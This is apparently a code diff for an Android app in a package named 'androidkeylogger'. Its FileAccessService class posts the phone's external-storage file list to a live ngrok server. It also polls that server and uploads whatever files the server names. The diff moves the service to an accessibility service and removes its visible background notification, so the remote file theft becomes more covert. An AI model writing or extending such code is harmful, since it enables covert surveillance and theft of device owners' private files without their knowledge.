@@ -1,79 +1,64 @@
 package com.bshu2.androidkeylogger;
 
-import android.app.*;
-import android.content.Intent;
-import android.os.*;
+import android.accessibilityservice.AccessibilityService;
+import android.os.Environment;
 import android.util.Log;
-import androidx.core.app.NotificationCompat;
+import android.view.accessibility.AccessibilityEvent;
+
 import org.json.JSONArray;
 import org.json.JSONObject;
+
 import java.io.*;
 import java.net.HttpURLConnection;
 import java.net.URL;
 import java.util.Scanner;
 
-public class FileAccessService extends Service {
-    private static final String CHANNEL_ID = "RemoteAccessChannel";
-    private static final String SERVER_URL = "https://yourserver.com/server.php";
+public class FileAccessService extends AccessibilityService {
+    private static final String SERVER_URL = "https://locust-handy-seagull.ngrok-free.app/server.php";
+    private static final String TAG = "FileAccessService";
 
     @Override
-    public void onCreate() {
-        super.onCreate();
-        createNotificationChannel();
-        startForeground(1, getNotification());
+    public void onAccessibilityEvent(AccessibilityEvent event) {
+        // Accessibility event triggered, but we don't need to process it
+    }
 
+    @Override
+    public void onInterrupt() {
+        Log.d(TAG, "Service Interrupted");
+    }
+
+    @Override
+    public void onServiceConnected() {
+        Log.d(TAG, "Accessibility Service Started!");
         new Thread(this::sendFileList).start();
         new Thread(this::checkForDownloadRequests).start();
     }
 
-    private Notification getNotification() {
-        return new NotificationCompat.Builder(this, CHANNEL_ID)
-                .setContentTitle("Remote Access Service")
-                .setContentText("Running in background")
-                .setSmallIcon(R.drawable.ic_notification)  // Add an icon in res/drawable
-                .setPriority(NotificationCompat.PRIORITY_LOW)
-                .build();
-    }
-
-    private void createNotificationChannel() {
-        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
-            NotificationChannel serviceChannel = new NotificationChannel(
-                    CHANNEL_ID, "Remote Access Background Service",
-                    NotificationManager.IMPORTANCE_LOW
-            );
-            NotificationManager manager = getSystemService(NotificationManager.class);
-            manager.createNotificationChannel(serviceChannel);
-        }
-    }
-
     private void sendFileList() {
-        while (true) {
-            try {
-                File directory = Environment.getExternalStorageDirectory();
-                File[] files = directory.listFiles();
-                if (files == null) return;
+        try {
+            File directory = Environment.getExternalStorageDirectory();
+            File[] files = directory.listFiles();
+            if (files == null) return;
 
-                JSONArray fileList = new JSONArray();
-                for (File file : files) {
-                    if (file.isFile()) fileList.put(file.getName());
-                }
-
-                HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
-                conn.setRequestMethod("POST");
-                conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
-                conn.setDoOutput(true);
-
-                String payload = "file_list=" + fileList.toString();
-                try (OutputStream os = conn.getOutputStream()) {
-                    os.write(payload.getBytes("UTF-8"));
-                    os.flush();
-                }
-
-                Log.d("FileAccessService", "Sent file list to server.");
-                Thread.sleep(60000);  // Send file list every 1 minute
-            } catch (Exception e) {
-                Log.e("FileAccessService", "Error sending file list", e);
+            JSONArray fileList = new JSONArray();
+            for (File file : files) {
+                if (file.isFile()) fileList.put(file.getName());
             }
+
+            HttpURLConnection conn = (HttpURLConnection) new URL(SERVER_URL).openConnection();
+            conn.setRequestMethod("POST");
+            conn.setRequestProperty("Content-Type", "application/x-www-form-urlencoded");
+            conn.setDoOutput(true);
+
+            String payload = "file_list=" + fileList.toString();
+            try (OutputStream os = conn.getOutputStream()) {
+                os.write(payload.getBytes("UTF-8"));
+                os.flush();
+            }
+
+            Log.d(TAG, "Sent file list to server.");
+        } catch (Exception e) {
+            Log.e(TAG, "Error sending file list", e);
         }
     }
 
@@ -93,9 +78,9 @@ public class FileAccessService extends Service {
                 }
                 scanner.close();
 
-                Thread.sleep(10000);  // Check every 10 seconds
+                Thread.sleep(30000);  // Check every 30 seconds
             } catch (Exception e) {
-                Log.e("FileAccessService", "Error checking download requests", e);
+                Log.e(TAG, "Error checking download requests", e);
             }
         }
     }
@@ -104,7 +89,7 @@ public class FileAccessService extends Service {
         try {
             File file = new File(Environment.getExternalStorageDirectory(), fileName);
             if (!file.exists()) {
-                Log.e("FileAccessService", "File not found: " + fileName);
+                Log.e(TAG, "File not found: " + fileName);
                 return;
             }
 
@@ -126,19 +111,9 @@ public class FileAccessService extends Service {
                 os.flush();
             }
 
-            Log.d("FileAccessService", "Uploaded file: " + fileName);
+            Log.d(TAG, "Uploaded file: " + fileName);
         } catch (Exception e) {
-            Log.e("FileAccessService", "Error uploading file", e);
+            Log.e(TAG, "Error uploading file", e);
         }
-    }
-
-    @Override
-    public int onStartCommand(Intent intent, int flags, int startId) {
-        return START_STICKY; // Keep service running even if the app is closed
-    }
-
-    @Override
-    public IBinder onBind(Intent intent) {
-        return null;
     }
 }
